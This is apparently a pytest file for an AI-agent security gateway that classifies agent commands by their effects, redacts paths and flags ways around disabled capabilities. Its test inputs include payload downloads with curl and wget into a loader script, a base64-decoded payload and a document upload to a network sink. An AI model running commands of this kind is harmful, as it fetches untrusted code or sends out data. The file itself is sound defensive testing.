from __future__ import annotations

import json

import pytest

from clawsentry.gateway.effect_normalizer import contextual_binding_parts, normalize_action_effect
from clawsentry.gateway.models import (
    CanonicalEvent,
    ContentEvidenceEnvelope,
    ContentEvidenceItem,
    DecisionContext,
    EventType,
    SessionScopeBaseRules,
    SessionScopeProfile,
    SessionScopeTaskRules,
)


def _event(
    *,
    tool_name: str,
    payload: dict,
    event_id: str = "evt-effect",
) -> CanonicalEvent:
    return CanonicalEvent(
        event_id=event_id,
        trace_id=f"trace-{event_id}",
        event_type=EventType.PRE_ACTION,
        session_id="sess-effect",
        agent_id="agent-effect",
        source_framework="test",
        occurred_at="2026-05-16T00:00:00+00:00",
        payload=payload,
        tool_name=tool_name,
    )


def _disabled_context(*capabilities: str) -> DecisionContext:
    return DecisionContext(
        session_scope_profile=SessionScopeProfile(
            profile_id="scope-disabled-capabilities",
            confirmed=True,
            dry_run=False,
            base_rules=SessionScopeBaseRules(
                denied_capabilities=list(capabilities),
            ),
        )
    )


def _scoped_context(root: str) -> DecisionContext:
    return DecisionContext(
        session_scope_profile=SessionScopeProfile(
            profile_id="scope-script-binding",
            confirmed=True,
            dry_run=False,
            task_rules=SessionScopeTaskRules(allowed_path_prefixes=[root]),
        )
    )


def test_contextual_binding_parts_hashes_raw_paths_and_cwd():
    event = CanonicalEvent(
        event_id="evt-binding",
        trace_id="trace-binding",
        event_type="pre_action",
        session_id="sess-binding",
        agent_id="agent-binding",
        source_framework="test",
        occurred_at="2026-05-21T00:00:00+00:00",
        tool_name="bash",
        payload={
            "command": "python3 scripts/verify.py > artifacts/out.json",
            "cwd": "/workspace/private/project",
        },
    )

    parts = contextual_binding_parts(event)
    serialized = json.dumps(parts, sort_keys=True)

    assert parts["effect_hash"].startswith("sha256:")
    assert parts["cwd_hash"].startswith("sha256:")
    assert "/workspace/private/project" not in serialized
    assert "artifacts/out.json" not in serialized


def test_contextual_binding_parts_hashes_script_content_when_available(tmp_path):
    script = tmp_path / "scripts" / "verify.py"
    script.parent.mkdir()
    script.write_text("print('v1')\n", encoding="utf-8")
    event = _event(
        tool_name="bash",
        payload={"command": "python3 scripts/verify.py", "cwd": str(tmp_path)},
        event_id="evt-script-content-v1",
    )

    context = _scoped_context(str(tmp_path))

    first = contextual_binding_parts(event, context)
    script.write_text("print('v2')\n", encoding="utf-8")
    second = contextual_binding_parts(event, context)

    assert first["script_or_content_hash"].startswith("sha256:")
    assert second["script_or_content_hash"].startswith("sha256:")
    assert first["script_or_content_hash"] != second["script_or_content_hash"]
    assert str(script) not in json.dumps(second, sort_keys=True)


def test_contextual_binding_parts_does_not_hash_absolute_script_paths(tmp_path):
    outside = tmp_path / "outside.py"
    outside.write_text("print('outside')\n", encoding="utf-8")
    event = _event(
        tool_name="bash",
        payload={"command": f"python3 {outside}", "cwd": str(tmp_path / "workspace")},
        event_id="evt-script-absolute",
    )

    parts = contextual_binding_parts(event, _scoped_context(str(tmp_path / "workspace")))

    assert parts["script_or_content_hash"] == parts["raw_payload_hash"]


def test_contextual_binding_parts_does_not_hash_symlink_escape(tmp_path):
    workspace = tmp_path / "workspace"
    script = workspace / "scripts" / "verify.py"
    outside = tmp_path / "outside.py"
    script.parent.mkdir(parents=True)
    outside.write_text("print('outside')\n", encoding="utf-8")
    script.symlink_to(outside)
    event = _event(
        tool_name="bash",
        payload={"command": "python3 scripts/verify.py", "cwd": str(workspace)},
        event_id="evt-script-symlink",
    )

    parts = contextual_binding_parts(event, _scoped_context(str(workspace)))

    assert parts["script_or_content_hash"] == parts["raw_payload_hash"]


def test_contextual_binding_parts_does_not_hash_oversize_script(tmp_path):
    script = tmp_path / "scripts" / "large.py"
    script.parent.mkdir()
    script.write_text("x = 1\n" * 200_000, encoding="utf-8")
    event = _event(
        tool_name="bash",
        payload={"command": "python3 scripts/large.py", "cwd": str(tmp_path)},
        event_id="evt-script-large",
    )

    parts = contextual_binding_parts(event, _scoped_context(str(tmp_path)))

    assert parts["script_or_content_hash"] == parts["raw_payload_hash"]


def test_contextual_binding_parts_does_not_hash_when_cwd_outside_allowed_scope(tmp_path):
    workspace = tmp_path / "workspace"
    outside = tmp_path / "outside"
    script = outside / "scripts" / "verify.py"
    script.parent.mkdir(parents=True)
    workspace.mkdir()
    script.write_text("print('outside')\n", encoding="utf-8")
    event = _event(
        tool_name="bash",
        payload={"command": "python3 scripts/verify.py", "cwd": str(outside)},
        event_id="evt-script-outside-scope",
    )

    parts = contextual_binding_parts(event, _scoped_context(str(workspace)))

    assert parts["script_or_content_hash"] == parts["raw_payload_hash"]


@pytest.mark.parametrize(
    ("tool_name", "payload", "expected_rule"),
    [
        ("Write", {"path": "build/loader.sh", "content": "#!/bin/sh\necho x"}, "native_write_effect"),
        ("bash", {"command": "printf '%s' x > build/loader.sh"}, "shell_redirection_write"),
        ("bash", {"command": "cat > build/loader.sh <<'EOF'\nx\nEOF"}, "shell_heredoc_write"),
        ("bash", {"command": "printf x | tee build/loader.sh"}, "shell_tee_write"),
        ("bash", {"command": "tee <<EOF build/loader.sh\nx\nEOF"}, "shell_tee_write"),
        ("bash", {"command": "base64 -d payload.b64 > build/loader.sh"}, "decode_to_file_write"),
        ("bash", {"command": "dd if=/tmp/payload of=build/loader.sh"}, "dd_output_write"),
        ("python", {"command": "python -c \"open('build/loader.sh', 'w').write('x')\""}, "python_file_write"),
        ("node", {"command": "node -e \"require('fs').writeFileSync('build/loader.sh', 'x')\""}, "node_file_write"),
        ("powershell", {"command": "Set-Content -Path build/loader.ps1 -Value x"}, "powershell_file_write"),
        ("powershell", {"command": "Set-Content -Path \"build/loader.ps1\" -Value x"}, "powershell_file_write"),
        ("powershell", {"command": "Set-Content -Path \"build/loader script.ps1\" -Value x"}, "powershell_file_write"),
        ("Agent", {"prompt": "Create build/loader.sh with the payload from earlier."}, "delegated_write_request"),
        ("bash", {"command": "curl https://example.test/payload.sh -o build/loader.sh"}, "network_download_write"),
        ("bash", {"command": "wget https://example.test/payload.sh -O build/loader.sh"}, "network_download_write"),
        ("bash", {"command": "scp host:/tmp/payload build/loader.sh"}, "network_download_write"),
    ],
)
def test_filesystem_write_equivalents_have_common_effect_and_redacted_targets(
    tool_name,
    payload,
    expected_rule,
):
    envelope = normalize_action_effect(_event(tool_name=tool_name, payload=payload))

    assert "filesystem.write" in envelope.effects
    assert expected_rule in envelope.evidence_rules
    assert envelope.confidence in {"medium", "high"}
    assert envelope.targets
    assert envelope.targets[0].path_hash.startswith("sha256:")

    summary = envelope.to_summary()
    serialized = json.dumps(summary, sort_keys=True)
    assert "build/loader.sh" not in serialized
    assert "build/loader.ps1" not in serialized
    assert "build/loader script.ps1" not in serialized
    assert payload.get("command", payload.get("content", payload.get("prompt", ""))) not in serialized


@pytest.mark.parametrize(
    ("tool_name", "payload", "expected_rule"),
    [
        ("bash", {"command": "curl https://example.test/payload.sh -o payload.sh"}, "network_equivalent_fetch"),
        ("python", {"command": "python -c \"import requests; requests.get('https://example.test')\""}, "python_network_fetch"),
        ("node", {"command": "node -e \"fetch('https://example.test')\""}, "node_network_fetch"),
    ],
)
def test_network_fetch_equivalents_share_network_effect(tool_name, payload, expected_rule):
    envelope = normalize_action_effect(_event(tool_name=tool_name, payload=payload))

    assert "network.fetch" in envelope.effects
    assert expected_rule in envelope.evidence_rules


def test_network_download_to_file_matches_disabled_filesystem_write():
    envelope = normalize_action_effect(
        _event(
            tool_name="bash",
            payload={"command": "curl https://example.test/payload.sh -o build/loader.sh"},
        ),
        context=_disabled_context("filesystem.write"),
    )

    assert "filesystem.write" in envelope.effects
    assert "network.fetch" in envelope.effects
    assert "network_download_write" in envelope.evidence_rules
    assert "disabled_capability_equivalent" in envelope.evidence_rules
    assert envelope.disabled_capabilities == ["filesystem.write"]


def test_disabled_capability_context_marks_equivalent_effect():
    event = _event(
        tool_name="bash",
        payload={"command": "printf '%s' x > build/loader.sh"},
    )
    envelope = normalize_action_effect(
        event,
        context=_disabled_context("filesystem.write"),
    )

    assert "disabled_capability_equivalent" in envelope.evidence_rules
    assert envelope.disabled_capabilities == ["filesystem.write"]


def test_unsupported_semantic_wrapper_is_explicit_not_silent_allow():
    event = _event(
        tool_name="bash",
        payload={"command": "bash <(cat build/generated.sh)"},
    )
    envelope = normalize_action_effect(event, context=_disabled_context("command.exec"))

    assert envelope.analysis_state == "unsupported"
    assert "wrapper_chain_unresolved" in envelope.evidence_rules


def test_content_evidence_upload_adds_network_upload_effect():
    context = DecisionContext(
        content_evidence=ContentEvidenceEnvelope(
            items=[
                ContentEvidenceItem(
                    canonical_evidence_id="ce_001",
                    kind="skill_script",
                    source="gateway_resolved_path",
                    path_trust="gateway_resolved_workspace",
                    resolver_status="resolved_static_local_path",
                    derived_rules=[
                        {"rule_id": "associated_script_network_sink", "severity": "high"},
                        {"rule_id": "document_input_to_network_sink", "severity": "high"},
                    ],
                )
            ]
        )
    )

    envelope = normalize_action_effect(
        _event(tool_name="bash", payload={"command": "python file_backup.py Q4_financial_report.pptx"}),
        context=context,
    )
    summary = envelope.to_summary()

    assert "network.upload" in summary["effects"]
    assert "associated_script_network_sink" in summary["evidence_rules"]
    assert "document_input_to_network_sink" in summary["evidence_rules"]
    assert {target["path_role"] for target in summary["targets"]} >= {"executed_script", "document_input"}
